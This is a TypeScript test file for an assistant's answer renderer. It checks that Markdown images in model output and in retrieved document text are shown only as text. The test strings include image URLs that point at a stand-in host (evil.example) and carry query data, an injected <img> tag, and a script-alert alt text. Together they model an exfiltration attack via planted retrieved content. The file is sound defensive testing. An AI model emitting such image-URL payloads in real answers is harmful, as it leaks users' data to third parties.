import { renderToStaticMarkup } from "react-dom/server";
import Markdown from "react-markdown";
import { describe, expect, it } from "vitest";
import { AssistantTurn } from "./components/AssistantTurn";
import { ANSWER_REMARK_PLUGINS } from "./markdownPlugins";
import type { AssistantMessage } from "./messages";
import type { Citation, Trace } from "./types";

// A browser fetches an image by itself, with no click, so an image URL written
// by the model could carry text out of the page. Every form of Markdown image
// must reach the page as words only.
const EVIL = "evil.example";

function render(markdown: string) {
  return renderToStaticMarkup(<Markdown remarkPlugins={ANSWER_REMARK_PLUGINS}>{markdown}</Markdown>);
}

describe("images in answers", () => {
  it("turns an inline image into its alt text", () => {
    expect(render(`Look: ![the chart](https://${EVIL}/c.png?q=my+question)`)).toBe("<p>Look: the chart</p>");
  });

  it("turns a reference image into its alt text", () => {
    const html = render(`![the chart][ref]\n\n[ref]: https://${EVIL}/r.png`);
    expect(html).toBe("<p>the chart</p>");
  });

  it("handles an image inside a table cell", () => {
    const html = render(`| a |\n|---|\n| ![cell](https://${EVIL}/t.png) |`);
    expect(html).toContain("<td>cell</td>");
    expect(html).not.toContain(EVIL);
  });

  it("keeps a link but not the image inside it", () => {
    const html = render(`[![inner](https://${EVIL}/i.png)](https://example.com)`);
    expect(html).toBe('<p><a href="https://example.com">inner</a></p>');
  });

  it("leaves nothing behind for an image with no alt text", () => {
    const html = render(`Before ![](https://${EVIL}/n.png) after`);
    expect(html).not.toContain("<img");
    expect(html).not.toContain(EVIL);
    expect(html).toContain("Before");
  });

  it("keeps alt text as text, never as markup", () => {
    const html = render(`![<script>alert(1)</script>](https://${EVIL}/a.png)`);
    expect(html).not.toContain("<script");
    expect(html).not.toContain("<img");
  });
});

describe("the assistant's turn", () => {
  const message = (status: AssistantMessage["status"]): AssistantMessage => ({
    role: "assistant",
    text: `Answer [1] ![leak](https://${EVIL}/c.png?q=my+question)\n\n![1](https://${EVIL}/marker.png)`,
    steps: [],
    citations: [],
    status,
  });

  // The whole path a live answer takes, citation-marker rewriting included,
  // both while it streams and once it's complete.
  it.each(["streaming", "done"] as const)("shows no image while %s", (status) => {
    const html = renderToStaticMarkup(
      <AssistantTurn
        message={message(status)}
        messageIndex={1}
        isLast
        onRetry={() => {}}
        onAskExample={() => {}}
      />,
    );
    expect(html).not.toContain("<img");
    expect(html).not.toContain('rel="preload"');
    expect(html).not.toContain(EVIL);
    expect(html).toContain("leak");
  });
});

describe("retrieved text in source cards and Under the hood", () => {
  // Document text comes from outside the project, so a planted image or tag
  // must stay visible as plain characters wherever a passage is shown.
  const HOSTILE = `![leak](https://${EVIL}/p.png) <img src=https://${EVIL}/h.png>`;
  const SHOWN_AS_TEXT = `![leak](https://${EVIL}/p.png) &lt;img src=https://${EVIL}/h.png&gt;`;

  const citation: Citation = {
    marker: 1,
    source: "doc",
    pages: [3],
    title: HOSTILE,
    section: HOSTILE,
    link: "/sources/doc?page=3",
  };
  const trace: Trace = {
    status: "done",
    steps: [
      {
        tool: "search_documents",
        call_id: "call-1",
        args: { query: HOSTILE, query_en: HOSTILE },
        phrasings: [{ text: HOSTILE, origins: ["query"], as_written: HOSTILE }],
        ranked_lists: 2,
        max_rrf_score: 0.03,
        results: [
          {
            rank: 1,
            marker: 1,
            new: true,
            source: "doc",
            pages: [3],
            title: HOSTILE,
            section: HOSTILE,
            snippet: HOSTILE,
            rrf_score: 0.03,
            vector_rank: 1,
            keyword_rank: null,
          },
        ],
        duration_ms: 10,
      },
    ],
    timeline: [],
    totals: {
      duration_ms: 10,
      first_token_ms: null,
      llm_calls: 1,
      input_tokens: 1,
      output_tokens: 1,
      reasoning_tokens: 0,
      tokens_complete: true,
    },
    model: { provider: "groq", name: "test-model" },
  };

  const html = renderToStaticMarkup(
    <AssistantTurn
      message={{ role: "assistant", text: "Answer [1]", steps: [], citations: [citation], trace, status: "done" }}
      messageIndex={1}
      isLast
      onRetry={() => {}}
      onAskExample={() => {}}
    />,
  );

  it("creates no image and no link to the planted URL", () => {
    expect(html).not.toContain("<img");
    expect(html).not.toContain('rel="preload"');
    expect(html).not.toContain(`href="https://${EVIL}`);
  });

  it("shows the planted text as plain characters", () => {
    expect(html).toContain(`<small>p. 3 · ${SHOWN_AS_TEXT}</small>`);
    expect(html).toContain(`<span class="doc">${SHOWN_AS_TEXT}</span>`);
  });
});

describe("every Markdown renderer", () => {
  // A new <Markdown> without these plugins would bring images back. Tests are
  // left out: this file has to mention the tag, in this very comment.
  const sources = import.meta.glob(["./**/*.tsx", "!./**/*.test.tsx"], {
    query: "?raw",
    import: "default",
    eager: true,
  }) as Record<string, string>;

  it("uses the answer plugins", () => {
    const tags = Object.values(sources).flatMap((source) => source.match(/<Markdown\b[^>]*>/g) ?? []);
    expect(tags.length).toBeGreaterThan(0);
    for (const tag of tags) expect(tag).toContain("remarkPlugins={ANSWER_REMARK_PLUGINS}");
  });
});
